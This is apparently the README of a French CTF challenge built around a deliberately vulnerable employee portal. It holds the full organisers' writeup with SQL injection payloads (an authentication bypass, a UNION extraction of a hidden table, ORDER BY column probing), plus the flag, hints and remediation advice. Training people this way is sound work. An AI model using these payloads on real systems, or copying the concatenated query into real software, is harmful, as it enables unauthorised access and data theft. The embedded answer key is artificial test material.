# Challenge 01 — Employee Portal (SQL Injection)

| | |
|---|---|
| **Catégorie** | Web |
| **Faille** | SQL Injection (auth bypass + UNION) |
| **Difficulté** | Facile |
| **Port** | 5001 (modifiable dans `docker-compose.yml`) |
| **Flag** | `UNIALONE{sql_1nj3ct10n_un10n_pwn}` *(à remplacer via `CHALLENGE_FLAG`)* |

---

## Description (à coller sur la plateforme / carte du challenge)

NovaCorp vient de mettre en ligne son portail employé. Le développeur jure que « personne ne peut deviner le mot de passe admin ». Connecte-toi et récupère la note interne confidentielle.

Un compte de démonstration existe, mais il ne te donnera pas les droits admin… sauf si tu trouves autre chose.

---

## Déploiement

```bash
cd 01-sql-injection
docker compose up --build -d
# challenge accessible sur http://<ip>:5001/
```

Change le flag avant publication, soit dans `docker-compose.yml` (`CHALLENGE_FLAG`), soit via l'interface de ta plateforme si elle gère les flags dynamiques.

---

## Writeup (solution complète — à garder côté organisateurs)

Le challenge a **deux chemins de résolution**, chacun illustre une facette de la SQLi.

### Chemin A — Auth bypass (le plus rapide)

Le login construit sa requête par concaténation :
```sql
SELECT id, username, role FROM users WHERE username='<u>' AND password='<p>'
```

En envoyant comme nom d'utilisateur :
```
admin'-- 
```
(mot de passe quelconque), la requête devient :
```sql
SELECT id, username, role FROM users WHERE username='admin'-- ' AND password='x'
```
Le `-- ` commente la vérification du mot de passe → on est connecté en tant qu'**admin**. Le dashboard affiche directement le flag (la note interne).

> Variante sans connaître le username : `' OR role='admin'-- ` renvoie aussi la ligne admin.

### Chemin B — UNION-based (extraction directe)

Une fois connecté (même en simple employé, ex. `jdupont / azerty`), l'annuaire `/search?q=` est injectable :
```sql
SELECT name, department FROM employees WHERE name LIKE '%<q>%'
```

La requête renvoie **2 colonnes** → on aligne un UNION sur la table cachée `secret_notes(title, flag)` :
```
' UNION SELECT title, flag FROM secret_notes-- 
```
La réponse devient :
```sql
... WHERE name LIKE '%' UNION SELECT title, flag FROM secret_notes-- %'
```
Le flag s'affiche dans la colonne « Département » des résultats.

> Méthodo à transmettre : d'abord déterminer le **nombre de colonnes** (`' ORDER BY 2-- ` passe, `' ORDER BY 3-- ` casse → 2 colonnes), puis construire le UNION.

### Le flag
`UNIALONE{sql_1nj3ct10n_un10n_pwn}` — dans la table `secret_notes`, visible via le chemin A (dashboard admin) ou le chemin B (UNION).

---

## Hints progressifs (à charger dans la plateforme)

1. Que fait le champ login de ton apostrophe `'` ?
2. Un commentaire SQL `-- ` coupe la fin de la requête.
3. L'annuaire aussi parle au même langage. Combien de colonnes renvoie-t-il ?

---

## Remédiation (pour le debrief / côté défense)

- **Requêtes préparées** (paramétrées) partout — jamais de concaténation.
- Principe du moindre privilège sur le compte DB.
- Messages d'erreur génériques (ne pas renvoyer l'erreur SQL brute).
- Contrôle du rôle côté serveur, indépendant de l'entrée utilisateur.

## Fichiers

- `app.py` — l'application vulnérable (Flask + SQLite)
- `requirements.txt`, `Dockerfile`, `docker-compose.yml` — déploiement
- La base est recréée à chaque démarrage (pas de persistance à gérer)
